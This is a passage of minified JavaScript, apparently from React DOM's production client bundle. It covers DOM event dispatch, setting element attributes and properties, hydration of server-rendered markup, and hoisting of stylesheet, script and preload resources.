e}N&&N(e,m,h),e==="focusout"&&h&&m.type==="number"&&h.memoizedProps.value!=null&&ai(m,"number",m.value)}switch(N=h?Ua(h):window,e){case"focusin":(Fs(N)||N.contentEditable==="true")&&(ea=N,pi=h,Ga=null);break;case"focusout":Ga=pi=ea=null;break;case"mousedown":Si=!0;break;case"contextmenu":case"mouseup":case"dragend":Si=!1,sf(T,l,p);break;case"selectionchange":if(Rh)break;case"keydown":case"keyup":sf(T,l,p)}var Z;if(yi)e:{switch(e){case"compositionstart":var I="onCompositionStart";break e;case"compositionend":I="onCompositionEnd";break e;case"compositionupdate":I="onCompositionUpdate";break e}I=void 0}else Pl?Js(e,l)&&(I="onCompositionEnd"):e==="keydown"&&l.keyCode===229&&(I="onCompositionStart");I&&(Vs&&l.locale!=="ko"&&(Pl||I!=="onCompositionStart"?I==="onCompositionEnd"&&Pl&&(Z=Ls()):(tl=p,fi="value"in tl?tl.value:tl.textContent,Pl=!0)),N=Du(h,I),0<N.length&&(I=new Xs(I,e,null,l,p),T.push({event:I,listeners:N}),Z?I.data=Z:(Z=Ws(l),Z!==null&&(I.data=Z)))),(Z=zh?Oh(e,l):Ch(e,l))&&(I=Du(h,"onBeforeInput"),0<I.length&&(N=new Xs("onBeforeInput","beforeinput",null,l,p),T.push({event:N,listeners:I}),N.data=Z)),vy(T,e,h,l,p)}wr(T,t)})}function yn(e,t,l){return{instance:e,listener:t,currentTarget:l}}function Du(e,t){for(var l=t+"Capture",a=[];e!==null;){var n=e,u=n.stateNode;if(n=n.tag,n!==5&&n!==26&&n!==27||u===null||(n=Ra(e,l),n!=null&&a.unshift(yn(e,n,u)),n=Ra(e,t),n!=null&&a.push(yn(e,n,u))),e.tag===3)return a;e=e.return}return[]}function Ty(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5&&e.tag!==27);return e||null}function Br(e,t,l,a,n){for(var u=t._reactName,i=[];l!==null&&l!==a;){var c=l,s=c.alternate,h=c.stateNode;if(c=c.tag,s!==null&&s===a)break;c!==5&&c!==26&&c!==27||h===null||(s=h,n?(h=Ra(l,u),h!=null&&i.unshift(yn(l,h,s))):n||(h=Ra(l,u),h!=null&&i.push(yn(l,h,s)))),l=l.return}i.length!==0&&e.push({event:t,listeners:i})}var Ay=/\r\n?/g,Ey=/\u0000|\uFFFD/g;function Yr(e){return(typeof e=="string"?e:""+e).replace(Ay,`
`).replace(Ey,"")}function qr(e,t){return t=Yr(t),Yr(e)===t}function re(e,t,l,a,n,u){switch(l){case"children":typeof a=="string"?t==="body"||t==="textarea"&&a===""||Fl(e,a):(typeof a=="number"||typeof a=="bigint")&&t!=="body"&&Fl(e,""+a);break;case"className":xn(e,"class",a);break;case"tabIndex":xn(e,"tabindex",a);break;case"dir":case"role":case"viewBox":case"width":case"height":xn(e,l,a);break;case"style":Bs(e,a,u);break;case"data":if(t!=="object"){xn(e,"data",a);break}case"src":case"href":if(a===""&&(t!=="a"||l!=="href")){e.removeAttribute(l);break}if(a==null||typeof a=="function"||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=Rn(""+a),e.setAttribute(l,a);break;case"action":case"formAction":if(typeof a=="function"){e.setAttribute(l,"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')");break}else typeof u=="function"&&(l==="formAction"?(t!=="input"&&re(e,t,"name",n.name,n,null),re(e,t,"formEncType",n.formEncType,n,null),re(e,t,"formMethod",n.formMethod,n,null),re(e,t,"formTarget",n.formTarget,n,null)):(re(e,t,"encType",n.encType,n,null),re(e,t,"method",n.method,n,null),re(e,t,"target",n.target,n,null)));if(a==null||typeof a=="symbol"||typeof a=="boolean"){e.removeAttribute(l);break}a=Rn(""+a),e.setAttribute(l,a);break;case"onClick":a!=null&&(e.onclick=jt);break;case"onScroll":a!=null&&F("scroll",e);break;case"onScrollEnd":a!=null&&F("scrollend",e);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(y(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(y(60));e.innerHTML=l}}break;case"multiple":e.multiple=a&&typeof a!="function"&&typeof a!="symbol";break;case"muted":e.muted=a&&typeof a!="function"&&typeof a!="symbol";break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"defaultValue":case"defaultChecked":case"innerHTML":case"ref":break;case"autoFocus":break;case"xlinkHref":if(a==null||typeof a=="function"||typeof a=="boolean"||typeof a=="symbol"){e.removeAttribute("xlink:href");break}l=Rn(""+a),e.setAttributeNS("http://www.w3.org/1999/xlink","xlink:href",l);break;case"contentEditable":case"spellCheck":case"draggable":case"value":case"autoReverse":case"externalResourcesRequired":case"focusable":case"preserveAlpha":a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""+a):e.removeAttribute(l);break;case"inert":case"allowFullScreen":case"async":case"autoPlay":case"controls":case"default":case"defer":case"disabled":case"disablePictureInPicture":case"disableRemotePlayback":case"formNoValidate":case"hidden":case"loop":case"noModule":case"noValidate":case"open":case"playsInline":case"readOnly":case"required":case"reversed":case"scoped":case"seamless":case"itemScope":a&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,""):e.removeAttribute(l);break;case"capture":case"download":a===!0?e.setAttribute(l,""):a!==!1&&a!=null&&typeof a!="function"&&typeof a!="symbol"?e.setAttribute(l,a):e.removeAttribute(l);break;case"cols":case"rows":case"size":case"span":a!=null&&typeof a!="function"&&typeof a!="symbol"&&!isNaN(a)&&1<=a?e.setAttribute(l,a):e.removeAttribute(l);break;case"rowSpan":case"start":a==null||typeof a=="function"||typeof a=="symbol"||isNaN(a)?e.removeAttribute(l):e.setAttribute(l,a);break;case"popover":F("beforetoggle",e),F("toggle",e),Mn(e,"popover",a);break;case"xlinkActuate":wt(e,"http://www.w3.org/1999/xlink","xlink:actuate",a);break;case"xlinkArcrole":wt(e,"http://www.w3.org/1999/xlink","xlink:arcrole",a);break;case"xlinkRole":wt(e,"http://www.w3.org/1999/xlink","xlink:role",a);break;case"xlinkShow":wt(e,"http://www.w3.org/1999/xlink","xlink:show",a);break;case"xlinkTitle":wt(e,"http://www.w3.org/1999/xlink","xlink:title",a);break;case"xlinkType":wt(e,"http://www.w3.org/1999/xlink","xlink:type",a);break;case"xmlBase":wt(e,"http://www.w3.org/XML/1998/namespace","xml:base",a);break;case"xmlLang":wt(e,"http://www.w3.org/XML/1998/namespace","xml:lang",a);break;case"xmlSpace":wt(e,"http://www.w3.org/XML/1998/namespace","xml:space",a);break;case"is":Mn(e,"is",a);break;case"innerText":case"textContent":break;default:(!(2<l.length)||l[0]!=="o"&&l[0]!=="O"||l[1]!=="n"&&l[1]!=="N")&&(l=$d.get(l)||l,Mn(e,l,a))}}function Qc(e,t,l,a,n,u){switch(l){case"style":Bs(e,a,u);break;case"dangerouslySetInnerHTML":if(a!=null){if(typeof a!="object"||!("__html"in a))throw Error(y(61));if(l=a.__html,l!=null){if(n.children!=null)throw Error(y(60));e.innerHTML=l}}break;case"children":typeof a=="string"?Fl(e,a):(typeof a=="number"||typeof a=="bigint")&&Fl(e,""+a);break;case"onScroll":a!=null&&F("scroll",e);break;case"onScrollEnd":a!=null&&F("scrollend",e);break;case"onClick":a!=null&&(e.onclick=jt);break;case"suppressContentEditableWarning":case"suppressHydrationWarning":case"innerHTML":case"ref":break;case"innerText":case"textContent":break;default:if(!Ds.hasOwnProperty(l))e:{if(l[0]==="o"&&l[1]==="n"&&(n=l.endsWith("Capture"),t=l.slice(2,n?l.length-7:void 0),u=e[Ke]||null,u=u!=null?u[l]:null,typeof u=="function"&&e.removeEventListener(t,u,n),typeof a=="function")){typeof u!="function"&&u!==null&&(l in e?e[l]=null:e.hasAttribute(l)&&e.removeAttribute(l)),e.addEventListener(t,a,n);break e}l in e?e[l]=a:a===!0?e.setAttribute(l,""):Mn(e,l,a)}}}function Le(e,t,l){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"img":F("error",e),F("load",e);var a=!1,n=!1,u;for(u in l)if(l.hasOwnProperty(u)){var i=l[u];if(i!=null)switch(u){case"src":a=!0;break;case"srcSet":n=!0;break;case"children":case"dangerouslySetInnerHTML":throw Error(y(137,t));default:re(e,t,u,i,l,null)}}n&&re(e,t,"srcSet",l.srcSet,l,null),a&&re(e,t,"src",l.src,l,null);return;case"input":F("invalid",e);var c=u=i=n=null,s=null,h=null;for(a in l)if(l.hasOwnProperty(a)){var p=l[a];if(p!=null)switch(a){case"name":n=p;break;case"type":i=p;break;case"checked":s=p;break;case"defaultChecked":h=p;break;case"value":u=p;break;case"defaultValue":c=p;break;case"children":case"dangerouslySetInnerHTML":if(p!=null)throw Error(y(137,t));break;default:re(e,t,a,p,l,null)}}Us(e,u,c,s,h,i,n,!1);return;case"select":F("invalid",e),a=i=u=null;for(n in l)if(l.hasOwnProperty(n)&&(c=l[n],c!=null))switch(n){case"value":u=c;break;case"defaultValue":i=c;break;case"multiple":a=c;default:re(e,t,n,c,l,null)}t=u,l=i,e.multiple=!!a,t!=null?Wl(e,!!a,t,!1):l!=null&&Wl(e,!!a,l,!0);return;case"textarea":F("invalid",e),u=n=a=null;for(i in l)if(l.hasOwnProperty(i)&&(c=l[i],c!=null))switch(i){case"value":a=c;break;case"defaultValue":n=c;break;case"children":u=c;break;case"dangerouslySetInnerHTML":if(c!=null)throw Error(y(91));break;default:re(e,t,i,c,l,null)}ws(e,a,n,u);return;case"option":for(s in l)l.hasOwnProperty(s)&&(a=l[s],a!=null)&&(s==="selected"?e.selected=a&&typeof a!="function"&&typeof a!="symbol":re(e,t,s,a,l,null));return;case"dialog":F("beforetoggle",e),F("toggle",e),F("cancel",e),F("close",e);break;case"iframe":case"object":F("load",e);break;case"video":case"audio":for(a=0;a<hn.length;a++)F(hn[a],e);break;case"image":F("error",e),F("load",e);break;case"details":F("toggle",e);break;case"embed":case"source":case"link":F("error",e),F("load",e);case"area":case"base":case"br":case"col":case"hr":case"keygen":case"meta":case"param":case"track":case"wbr":case"menuitem":for(h in l)if(l.hasOwnProperty(h)&&(a=l[h],a!=null))switch(h){case"children":case"dangerouslySetInnerHTML":throw Error(y(137,t));default:re(e,t,h,a,l,null)}return;default:if(ni(t)){for(p in l)l.hasOwnProperty(p)&&(a=l[p],a!==void 0&&Qc(e,t,p,a,l,void 0));return}}for(c in l)l.hasOwnProperty(c)&&(a=l[c],a!=null&&re(e,t,c,a,l,null))}function zy(e,t,l,a){switch(t){case"div":case"span":case"svg":case"path":case"a":case"g":case"p":case"li":break;case"input":var n=null,u=null,i=null,c=null,s=null,h=null,p=null;for(g in l){var T=l[g];if(l.hasOwnProperty(g)&&T!=null)switch(g){case"checked":break;case"value":break;case"defaultValue":s=T;default:a.hasOwnProperty(g)||re(e,t,g,null,a,T)}}for(var m in a){var g=a[m];if(T=l[m],a.hasOwnProperty(m)&&(g!=null||T!=null))switch(m){case"type":u=g;break;case"name":n=g;break;case"checked":h=g;break;case"defaultChecked":p=g;break;case"value":i=g;break;case"defaultValue":c=g;break;case"children":case"dangerouslySetInnerHTML":if(g!=null)throw Error(y(137,t));break;default:g!==T&&re(e,t,m,g,a,T)}}li(e,i,c,s,h,p,u,n);return;case"select":g=i=c=m=null;for(u in l)if(s=l[u],l.hasOwnProperty(u)&&s!=null)switch(u){case"value":break;case"multiple":g=s;default:a.hasOwnProperty(u)||re(e,t,u,null,a,s)}for(n in a)if(u=a[n],s=l[n],a.hasOwnProperty(n)&&(u!=null||s!=null))switch(n){case"value":m=u;break;case"defaultValue":c=u;break;case"multiple":i=u;default:u!==s&&re(e,t,n,u,a,s)}t=c,l=i,a=g,m!=null?Wl(e,!!l,m,!1):!!a!=!!l&&(t!=null?Wl(e,!!l,t,!0):Wl(e,!!l,l?[]:"",!1));return;case"textarea":g=m=null;for(c in l)if(n=l[c],l.hasOwnProperty(c)&&n!=null&&!a.hasOwnProperty(c))switch(c){case"value":break;case"children":break;default:re(e,t,c,null,a,n)}for(i in a)if(n=a[i],u=l[i],a.hasOwnProperty(i)&&(n!=null||u!=null))switch(i){case"value":m=n;break;case"defaultValue":g=n;break;case"children":break;case"dangerouslySetInnerHTML":if(n!=null)throw Error(y(91));break;default:n!==u&&re(e,t,i,n,a,u)}Rs(e,m,g);return;case"option":for(var _ in l)m=l[_],l.hasOwnProperty(_)&&m!=null&&!a.hasOwnProperty(_)&&(_==="selected"?e.selected=!1:re(e,t,_,null,a,m));for(s in a)m=a[s],g=l[s],a.hasOwnProperty(s)&&m!==g&&(m!=null||g!=null)&&(s==="selected"?e.selected=m&&typeof m!="function"&&typeof m!="symbol":re(e,t,s,m,a,g));return;case"img":case"link":case"area":case"base":case"br":case"col":case"embed":case"hr":case"keygen":case"meta":case"param":case"source":case"track":case"wbr":case"menuitem":for(var B in l)m=l[B],l.hasOwnProperty(B)&&m!=null&&!a.hasOwnProperty(B)&&re(e,t,B,null,a,m);for(h in a)if(m=a[h],g=l[h],a.hasOwnProperty(h)&&m!==g&&(m!=null||g!=null))switch(h){case"children":case"dangerouslySetInnerHTML":if(m!=null)throw Error(y(137,t));break;default:re(e,t,h,m,a,g)}return;default:if(ni(t)){for(var de in l)m=l[de],l.hasOwnProperty(de)&&m!==void 0&&!a.hasOwnProperty(de)&&Qc(e,t,de,void 0,a,m);for(p in a)m=a[p],g=l[p],!a.hasOwnProperty(p)||m===g||m===void 0&&g===void 0||Qc(e,t,p,m,a,g);return}}for(var r in l)m=l[r],l.hasOwnProperty(r)&&m!=null&&!a.hasOwnProperty(r)&&re(e,t,r,null,a,m);for(T in a)m=a[T],g=l[T],!a.hasOwnProperty(T)||m===g||m==null&&g==null||re(e,t,T,m,a,g)}function Lr(e){switch(e){case"css":case"script":case"font":case"img":case"image":case"input":case"link":return!0;default:return!1}}function Oy(){if(typeof performance.getEntriesByType=="function"){for(var e=0,t=0,l=performance.getEntriesByType("resource"),a=0;a<l.length;a++){var n=l[a],u=n.transferSize,i=n.initiatorType,c=n.duration;if(u&&c&&Lr(i)){for(i=0,c=n.responseEnd,a+=1;a<l.length;a++){var s=l[a],h=s.startTime;if(h>c)break;var p=s.transferSize,T=s.initiatorType;p&&Lr(T)&&(s=s.responseEnd,i+=p*(s<c?1:(c-h)/(s-h)))}if(--a,t+=8*(u+i)/(n.duration/1e3),e++,10<e)break}}if(0<e)return t/e/1e6}return navigator.connection&&(e=navigator.connection.downlink,typeof e=="number")?e:5}var Vc=null,Zc=null;function Hu(e){return e.nodeType===9?e:e.ownerDocument}function kr(e){switch(e){case"http://www.w3.org/2000/svg":return 1;case"http://www.w3.org/1998/Math/MathML":return 2;default:return 0}}function Gr(e,t){if(e===0)switch(t){case"svg":return 1;case"math":return 2;default:return 0}return e===1&&t==="foreignObject"?0:e}function Kc(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.children=="bigint"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var Jc=null;function Cy(){var e=window.event;return e&&e.type==="popstate"?e===Jc?!1:(Jc=e,!0):(Jc=null,!1)}var Xr=typeof setTimeout=="function"?setTimeout:void 0,_y=typeof clearTimeout=="function"?clearTimeout:void 0,Qr=typeof Promise=="function"?Promise:void 0,Dy=typeof queueMicrotask=="function"?queueMicrotask:typeof Qr<"u"?function(e){return Qr.resolve(null).then(e).catch(Hy)}:Xr;function Hy(e){setTimeout(function(){throw e})}function pl(e){return e==="head"}function Vr(e,t){var l=t,a=0;do{var n=l.nextSibling;if(e.removeChild(l),n&&n.nodeType===8)if(l=n.data,l==="/$"||l==="/&"){if(a===0){e.removeChild(n),_a(t);return}a--}else if(l==="$"||l==="$?"||l==="$~"||l==="$!"||l==="&")a++;else if(l==="html")mn(e.ownerDocument.documentElement);else if(l==="head"){l=e.ownerDocument.head,mn(l);for(var u=l.firstChild;u;){var i=u.nextSibling,c=u.nodeName;u[xa]||c==="SCRIPT"||c==="STYLE"||c==="LINK"&&u.rel.toLowerCase()==="stylesheet"||l.removeChild(u),u=i}}else l==="body"&&mn(e.ownerDocument.body);l=n}while(l);_a(t)}function Zr(e,t){var l=e;e=0;do{var a=l.nextSibling;if(l.nodeType===1?t?(l._stashedDisplay=l.style.display,l.style.display="none"):(l.style.display=l._stashedDisplay||"",l.getAttribute("style")===""&&l.removeAttribute("style")):l.nodeType===3&&(t?(l._stashedText=l.nodeValue,l.nodeValue=""):l.nodeValue=l._stashedText||""),a&&a.nodeType===8)if(l=a.data,l==="/$"){if(e===0)break;e--}else l!=="$"&&l!=="$?"&&l!=="$~"&&l!=="$!"||e++;l=a}while(l)}function Wc(e){var t=e.firstChild;for(t&&t.nodeType===10&&(t=t.nextSibling);t;){var l=t;switch(t=t.nextSibling,l.nodeName){case"HTML":case"HEAD":case"BODY":Wc(l),ei(l);continue;case"SCRIPT":case"STYLE":continue;case"LINK":if(l.rel.toLowerCase()==="stylesheet")continue}e.removeChild(l)}}function Ny(e,t,l,a){for(;e.nodeType===1;){var n=l;if(e.nodeName.toLowerCase()!==t.toLowerCase()){if(!a&&(e.nodeName!=="INPUT"||e.type!=="hidden"))break}else if(a){if(!e[xa])switch(t){case"meta":if(!e.hasAttribute("itemprop"))break;return e;case"link":if(u=e.getAttribute("rel"),u==="stylesheet"&&e.hasAttribute("data-precedence"))break;if(u!==n.rel||e.getAttribute("href")!==(n.href==null||n.href===""?null:n.href)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin)||e.getAttribute("title")!==(n.title==null?null:n.title))break;return e;case"style":if(e.hasAttribute("data-precedence"))break;return e;case"script":if(u=e.getAttribute("src"),(u!==(n.src==null?null:n.src)||e.getAttribute("type")!==(n.type==null?null:n.type)||e.getAttribute("crossorigin")!==(n.crossOrigin==null?null:n.crossOrigin))&&u&&e.hasAttribute("async")&&!e.hasAttribute("itemprop"))break;return e;default:return e}}else if(t==="input"&&e.type==="hidden"){var u=n.name==null?null:""+n.name;if(n.type==="hidden"&&e.getAttribute("name")===u)return e}else return e;if(e=bt(e.nextSibling),e===null)break}return null}function My(e,t,l){if(t==="")return null;for(;e.nodeType!==3;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!l||(e=bt(e.nextSibling),e===null))return null;return e}function Kr(e,t){for(;e.nodeType!==8;)if((e.nodeType!==1||e.nodeName!=="INPUT"||e.type!=="hidden")&&!t||(e=bt(e.nextSibling),e===null))return null;return e}function Fc(e){return e.data==="$?"||e.data==="$~"}function $c(e){return e.data==="$!"||e.data==="$?"&&e.ownerDocument.readyState!=="loading"}function xy(e,t){var l=e.ownerDocument;if(e.data==="$~")e._reactRetry=t;else if(e.data!=="$?"||l.readyState!=="loading")t();else{var a=function(){t(),l.removeEventListener("DOMContentLoaded",a)};l.addEventListener("DOMContentLoaded",a),e._reactRetry=a}}function bt(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?"||t==="$~"||t==="&"||t==="F!"||t==="F")break;if(t==="/$"||t==="/&")return null}}return e}var Ic=null;function Jr(e){e=e.nextSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="/$"||l==="/&"){if(t===0)return bt(e.nextSibling);t--}else l!=="$"&&l!=="$!"&&l!=="$?"&&l!=="$~"&&l!=="&"||t++}e=e.nextSibling}return null}function Wr(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var l=e.data;if(l==="$"||l==="$!"||l==="$?"||l==="$~"||l==="&"){if(t===0)return e;t--}else l!=="/$"&&l!=="/&"||t++}e=e.previousSibling}return null}function Fr(e,t,l){switch(t=Hu(l),e){case"html":if(e=t.documentElement,!e)throw Error(y(452));return e;case"head":if(e=t.head,!e)throw Error(y(453));return e;case"body":if(e=t.body,!e)throw Error(y(454));return e;default:throw Error(y(451))}}function mn(e){for(var t=e.attributes;t.length;)e.removeAttributeNode(t[0]);ei(e)}var Tt=new Map,$r=new Set;function Nu(e){return typeof e.getRootNode=="function"?e.getRootNode():e.nodeType===9?e:e.ownerDocument}var It=O.d;O.d={f:Uy,r:Ry,D:wy,C:jy,L:By,m:Yy,X:Ly,S:qy,M:ky};function Uy(){var e=It.f(),t=Tu();return e||t}function Ry(e){var t=Zl(e);t!==null&&t.tag===5&&t.type==="form"?yo(t):It.r(e)}var za=typeof document>"u"?null:document;function Ir(e,t,l){var a=za;if(a&&typeof t=="string"&&t){var n=ht(t);n='link[rel="'+e+'"][href="'+n+'"]',typeof l=="string"&&(n+='[crossorigin="'+l+'"]'),$r.has(n)||($r.add(n),e={rel:e,crossOrigin:l,href:t},a.querySelector(n)===null&&(t=a.createElement("link"),Le(t,"link",e),Ue(t),a.head.appendChild(t)))}}function wy(e){It.D(e),Ir("dns-prefetch",e,null)}function jy(e,t){It.C(e,t),Ir("preconnect",e,t)}function By(e,t,l){It.L(e,t,l);var a=za;if(a&&e&&t){var n='link[rel="preload"][as="'+ht(t)+'"]';t==="image"&&l&&l.imageSrcSet?(n+='[imagesrcset="'+ht(l.imageSrcSet)+'"]',typeof l.imageSizes=="string"&&(n+='[imagesizes="'+ht(l.imageSizes)+'"]')):n+='[href="'+ht(e)+'"]';var u=n;switch(t){case"style":u=Oa(e);break;case"script":u=Ca(e)}Tt.has(u)||(e=j({rel:"preload",href:t==="image"&&l&&l.imageSrcSet?void 0:e,as:t},l),Tt.set(u,e),a.querySelector(n)!==null||t==="style"&&a.querySelector(gn(u))||t==="script"&&a.querySelector(vn(u))||(t=a.createElement("link"),Le(t,"link",e),Ue(t),a.head.appendChild(t)))}}function Yy(e,t){It.m(e,t);var l=za;if(l&&e){var a=t&&typeof t.as=="string"?t.as:"script",n='link[rel="modulepreload"][as="'+ht(a)+'"][href="'+ht(e)+'"]',u=n;switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":u=Ca(e)}if(!Tt.has(u)&&(e=j({rel:"modulepreload",href:e},t),Tt.set(u,e),l.querySelector(n)===null)){switch(a){case"audioworklet":case"paintworklet":case"serviceworker":case"sharedworker":case"worker":case"script":if(l.querySelector(vn(u)))return}a=l.createElement("link"),Le(a,"link",e),Ue(a),l.head.appendChild(a)}}}function qy(e,t,l){It.S(e,t,l);var a=za;if(a&&e){var n=Kl(a).hoistableStyles,u=Oa(e);t=t||"default";var i=n.get(u);if(!i){var c={loading:0,preload:null};if(i=a.querySelector(gn(u)))c.loading=5;else{e=j({rel:"stylesheet",href:e,"data-precedence":t},l),(l=Tt.get(u))&&Pc(e,l);var s=i=a.createElement("link");Ue(s),Le(s,"link",e),s._p=new Promise(function(h,p){s.onload=h,s.onerror=p}),s.addEventListener("load",function(){c.loading|=1}),s.addEventListener("error",function(){c.loading|=2}),c.loading|=4,Mu(i,t,a)}i={type:"stylesheet",instance:i,count:1,state:c},n.set(u,i)}}}function Ly(e,t){It.X(e,t);var l=za;if(l&&e){var a=Kl(l).hoistableScripts,n=Ca(e),u=a.get(n);u||(u=l.querySelector(vn(n)),u||(e=j({src:e,async:!0},t),(t=Tt.get(n))&&es(e,t),u=l.createElement("script"),Ue(u),Le(u,"link",e),l.head.appendChild(u)),u={type:"script",instance:u,count:1,state:null},a.set(n,u))}}function ky(e,t){It.M(e,t);var l=za;if(l&&e){var a=Kl(l).hoistableScripts,n=Ca(e),u=a.get(n);u||(u=l.querySelector(vn(n)),u||(e=j({src:e,async:!0,type:"module"},t),(t=Tt.get(n))&&es(e,t),u=l.createElement("script"),Ue(u),Le(u,"link",e),l.head.appendChild(u)),u={type:"script",instance:u,count:1,state:null},a.set(n,u))}}function Pr(e,t,l,a){var n=(n=J.current)?Nu(n):null;if(!n)throw Error(y(446));switch(e){case"meta":case"title":return null;case"style":return typeof l.precedence=="string"&&typeof l.href=="string"?(t=Oa(l.href),l=Kl(n).hoistableStyles,a=l.get(t),a||(a={type:"style",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};case"link":if(l.rel==="stylesheet"&&typeof l.href=="string"&&typeof l.precedence=="string"){e=Oa(l.href);var u=Kl(n).hoistableStyles,i=u.get(e);if(i||(n=n.ownerDocument||n,i={type:"stylesheet",instance:null,count:0,state:{loading:0,preload:null}},u.set(e,i),(u=n.querySelector(gn(e)))&&!u._p&&(i.instance=u,i.state.loading=5),Tt.has(e)||(l={rel:"preload",as:"style",href:l.href,crossOrigin:l.crossOrigin,integrity:l.integrity,media:l.media,hrefLang:l.hrefLang,referrerPolicy:l.referrerPolicy},Tt.set(e,l),u||Gy(n,e,l,i.state))),t&&a===null)throw Error(y(528,""));return i}if(t&&a!==null)throw Error(y(529,""));return null;case"script":return t=l.async,l=l.src,typeof l=="string"&&t&&typeof t!="function"&&typeof t!="symbol"?(t=Ca(l),l=Kl(n).hoistableScripts,a=l.get(t),a||(a={type:"script",instance:null,count:0,state:null},l.set(t,a)),a):{type:"void",instance:null,count:0,state:null};default:throw Error(y(444,e))}}function Oa(e){return'href="'+ht(e)+'"'}function gn(e){return'link[rel="stylesheet"]['+e+"]"}function ed(e){return j({},e,{"data-precedence":e.precedence,precedence:null})}function Gy(e,t,l,a){e.querySelector('link[rel="preload"][as="style"]['+t+"]")?a.loading=1:(t=e.createElement("link"),a.preload=t,t.addEventListener("load",function(){return a.loading|=1}),t.addEventListener("error",function(){return a.loading|=2}),Le(t,"link",l),Ue(t),e.head.appendChild(t))}function Ca(e){return'[src="'+ht(e)+'"]'}function vn(e){return"script[async]"+e}function td(e,t,l){if(t.count++,t.instance===null)switch(t.type){case"style":var a=e.querySelector('style[data-href~="'+ht(l.href)+'"]');if(a)return t.instance=a,Ue(a),a;var n=j({},l,{"data-href":l.href,"data-precedence":l.precedence,href:null,precedence:null});return a=(e.ownerDocument||e).createElement("style"),Ue(a),Le(a,"style",n),Mu(a,l.precedence,e),t.instance=a;case"stylesheet":n=Oa(l.href);var u=e.querySelector(gn(n));if(u)return t.state.loading|=4,t.instance=u,Ue(u),u;a=ed(l),(n=Tt.get(n))&&Pc(a,n),u=(e.ownerDocument||e).createElement("link"),Ue(u);var i=u;return i._p=new Promise(function(c,s){i.onload=c,i.onerror=s}),Le(u,"link",a),t.state.loading|=4,Mu(u,l.precedence,e),t.instance=u;case"script":return u=Ca(l.src),(n=e.querySelector(vn(u)))?(t.instance=n,Ue(n),n):(a=l,(n=Tt.get(u))&&(a=j({},l),es(a,n)),e=e.ownerDocument||e,n=e.createElement("script"),Ue(n),Le(n,"link",a),e.head.appendChild(n),t.instance=n);case"void":return null;default:throw Error(y(443,t.type))}else t.type==="stylesheet"&&(t.state.loading&4)===0&&(a=t.instance,t.state.loading|=4,Mu(a,l.precedence,e));return t.instance}function Mu(e,t,l){for(var a=l.querySelectorAll('link[rel="stylesheet"][data-precedence],style[data-precedence]'),n=a.length?a[a.length-1]:null,u=n,i=0;i<a.length;i++){var c=a[i];if(c.dataset.precedence===t)u=c;else if(u!==n)break}u?u.parentNode.insertBefore(e,u.nextSibling):(t=l.nodeType===9?l.head:l,t.insertBefore(e,t.firstChild))}function Pc(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.title==null&&(e.title=t.title)}function es(e,t){e.crossOrigin==null&&(e.crossOrigin=t.crossOrigin),e.referrerPolicy==null&&(e.referrerPolicy=t.referrerPolicy),e.integrity==null&&(e.integrity=t.integrity)}var xu=null;function ld(e,t,l){if(xu===null){var a=new Map,n=xu=new Map;n.set(l,a)}else n=xu,a=n.get(l),a||(a=new Map,n.set(l,a));if(a.has(e))return a;for(a.set(e,null),l=l.getElementsByTagName(e),n=0;n<l.length;n++){var u=l[n];if(!(u[xa]||u[je]||e==="link"&&u.getAttribute("rel")==="stylesheet")&&u.namespaceURI!=="http://www.w3.org/2000/svg"){var i=u.getAttribute(t)||"";i=e+i;var c=a.get(i);c?c.push(u):a.set(i,[u])}}return a}function ad(e,t,l){e=e.ownerDocument||e,e.head.insertBefore(l,t==="title"?e.querySelector("head > title"):null)}function Xy(e,t,l){if(l===1||t.itemProp!=null)return!1;switch(e){case"meta":case"title":return!0;case"style":if(typeof t.precedence!="string"||typeof t.href!="string"||t.href==="")break;return!0;case"link":if(typeof t.rel!="string"||typeof t.href!="string"||t.href===""||t.onLoad||t.onError)break;return t.rel==="stylesheet"?(e=t.disabled,typeof t.precedence=="string"&&e==null):!0;case"script":if(t.async&&typeof t.async!="function"&&typeof t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function nd(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function Qy(e,t,l,a){if(l.type==="stylesheet"&&(typeof a.media!="string"||matchMedia(a.media).matches!==!1)&&(l.state.loading&4)===0){if(l.instance===null){var n=Oa(a.href),u=t.querySelector(gn(n));if(u){t=u._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=Uu.bind(e),t.then(e,e)),l.state.loading|=4,l.instance=u,Ue(u);return}u=t.ownerDocument||t,a=ed(a),(n=Tt.get(n))&&Pc(a,n),u=u.createElement("link"),Ue(u);var i=u;i._p=new Promise(function(c,s){i.onload=c,i.onerror=s}),Le(u,"link",a),l.instance=u}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(l,t),(t=l.state.preload)&&(l.state.loading&3)===0&&(e.count++,l=Uu.bind(e),t.addEventListener("load",l),t.addEventListener("error",l))}}var ts=0;function Vy(e,t){return 